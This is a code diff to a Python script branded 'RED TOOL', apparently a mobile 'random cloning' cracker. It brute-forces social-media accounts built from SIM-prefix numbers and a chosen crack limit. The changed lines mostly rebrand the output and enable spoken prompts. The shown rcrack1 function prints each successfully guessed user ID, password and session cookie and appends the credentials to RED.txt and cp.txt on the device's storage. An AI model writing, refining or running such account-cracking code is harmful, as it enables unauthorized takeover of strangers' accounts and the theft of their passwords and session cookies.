@@ -316,12 +316,12 @@ os.system('xdg-open https://t.me/+626cHxTq2f9iYzdl')
 
 logo = ("""
 
-\033[1;32m██████╗ ███████╗██████╗     
-\033[1;91m██╔══██╗██╔════╝██╔══██╗    
-\033[1;97m██████╔╝█████╗  ██║  ██║    
-\033[1;91m██╔══██╗██╔══╝  ██║  ██║    
-\033[1;33m██║  ██║███████╗██████╔╝    
-\033[1;34m╚═╝  ╚═╝╚══════╝╚═════╝                                                            
+\033[1;32m██████╗ \033[1;91m███████╗\033[1;32m██████╗     
+\033[1;32m██╔══██╗\033[1;91m██╔════╝\033[1;32m██╔══██╗    
+\033[1;32m██████╔╝\033[1;91m█████╗  \033[1;32m██║  ██║    
+\033[1;32m██╔══██╗\033[1;91m██╔══╝  \033[1;32m██║  ██║    
+\033[1;32m██║  ██║\033[1;91m███████╗\033[1;32m██████╔╝    
+\033[1;32m╚═╝  ╚═╝\033[1;91m╚══════╝\033[1;32m╚═════╝                                                            
                                                                       
               \x1b[37;41m\t WELLCOME TO RED TOOL\x1b[0;m\n\n\x1b[1;37m                          
 \33[1;37m----------------------------------------------
@@ -351,7 +351,7 @@ class Main:
 
         print(logo)
 
-        #os.system('espeak -a 200 "Welcome Random Clone"')
+        os.system('espeak -a 200 "Welcome Random Clone RED"')
 
         print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═XXX═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
 
@@ -387,7 +387,7 @@ def num():
 
     print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
 
-    #s.system('espeak -a 200 "Select your Number"')
+    os.system('espeak -a 200 "Select your Number"')
 
     kode = input(' [?] Enter sim code: ')
 
@@ -401,7 +401,7 @@ def num():
 
     print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
 
-    #s.system('espeak -a 200 "select Crack Limit"')
+    os.system('espeak -a 200 "select Crack Limit"')
 
     limit = int(input(' [?] Crack Your Limit : '))
 
@@ -417,7 +417,7 @@ def num():
 
         print(logo)
 
-        #s.system('espeak -a 200 "Random cloning Started GOJO SATURO"')
+        os.system('espeak -a 200 "Random cloning Started RED , RED , RED"')
 
         tl = str(len(user))
 
@@ -429,7 +429,7 @@ def num():
 
         print(' \033[1;91m[+] Wait For ids ')
 
-        print(' \033[1;97m[+] Use Flight [✈️] Mode For Speed Up ')
+        print(' \033[1;97m[+] Use Flight Mode For Speed Up ')
 
         print("\033[1;91m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
 
@@ -443,7 +443,7 @@ def num():
 
     print(' [+] Crack process has been completed')
 
-    print(' [+] Ids saved in ok.txt,cp.txt')
+    print(' [+] Ids saved in RED.txt,cp.txt')
 
 
 
@@ -524,11 +524,11 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[7:22]
 
-                print(f"\033[38;5;46m[ok👙] {uid} | {ps}")
+                print(f"\033[38;5;46m[🆗🟢] {uid} | {ps}")
 
-                print(f" Cookie : {coki}Ua = \033[1;34m'+pro+'  \033[0;97m")
+                print(f" Cookie : {coki} = \033[1;34m'+RED'  \033[0;97m")
 
-                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/RED.txt', 'a').write(uid+' | '+ps+'\n')
 
                 oks.append(uid)
 
@@ -540,7 +540,7 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[82:97]
 
-                print(f"\x1b[38;5;196m[X-CP🩸] {uid}|{ps}ua = \033[1;34m'+pro+'  \033[0;97m")
+              #  print(f"\x1b[38;5;196m[X-CP🩸] {uid}|{ps} = \033[1;34m'+pro+'  \033[0;97m")
 
                 open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
 
